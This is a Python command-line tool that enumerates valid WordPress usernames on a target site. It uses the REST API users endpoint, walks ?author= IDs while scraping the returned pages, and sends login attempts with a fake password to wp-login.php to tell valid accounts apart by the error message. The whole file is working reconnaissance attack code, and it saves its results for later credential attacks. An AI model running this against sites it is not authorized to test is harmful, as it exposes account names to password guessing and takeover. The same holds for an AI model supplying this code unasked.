#!/usr/bin/python3

import requests
import argparse
import json
from bs4 import BeautifulSoup

def info(string):
    if args.verbose:
        print(string.replace("\n",""))

def api_enum():
    r = s.get(args.url+'/wp-json/wp/v2/users?per_page=100')
    users_json = json.loads(r.text)
    for i in users_json:
        given_users.add(i['name'].lower())
        given_users.add(i['slug'].lower())
        info(f"Find Name: {i['name']}, Slug: {i['slug']}")
        
def id_enum():
    for id in range(2,101):
        r = s.get(f'{args.url}/?author={id}')
        if r.status_code == 200:
            soup = BeautifulSoup(r.content, "html.parser")
            name = soup.find("span").get_text()
            body = soup.find('body')
            slug = body.get('class')[2].replace('author-','')
            given_users.add(name.lower())
            given_users.add(slug.lower())   
            info(f'Find Name: {name}, Slug: {slug}')

def login_enum():
    val_users = []
    for username in given_users:
        data = {
            'log':username,
            'pwd':'p@assword',
            'wp-submit':'Login In'
        }
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        r = s.post(args.url+'/wp-login.php', headers=headers, data=data, verify=False)
        if 'The password you entered for the username' in r.text:
            val_users.append(username)
        else:
            info(f"[-] Tryed: {username}")
    return val_users

def main():
    print("Running\n")
    if 'api' in methode_list:
        api_enum()
    if 'id' in methode_list:
        id_enum()
    print(f'Find {len(given_users)} possible usernames')
    val_users = login_enum()
    print("Valide Usernames: "+str(val_users))
    if args.output:
        with open(args.output, 'w') as f:
            for user in val_users:
                f.write("%s\n" % user)
        f.close()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description = 'Username Enumartion via API, User-ID and Login Alert')
    group_enum = parser.add_mutually_exclusive_group(required=True)
    parser.add_argument('--url', required=True, type=str)
    group_enum.add_argument('-u', '--userlist', nargs='*' , default=[])
    group_enum.add_argument('-m', '--methode',default='', type=str ,help='Select one or both: {api,id}')
    parser.add_argument('-v', '--verbose', action=argparse.BooleanOptionalAction, default=False)
    parser.add_argument('-o', '--output', nargs='?', default=None, const='wp_username.lst')
    methode_list = parser.parse_args().methode.split(",")
    args = parser.parse_args()

    s = requests.session()
    given_users = set()
    if args.userlist:
        for listname in args.userlist:
            username_list = [line.lower().replace("\n","") for line in open(listname, 'r')]
            given_users.update(username_list)
    main()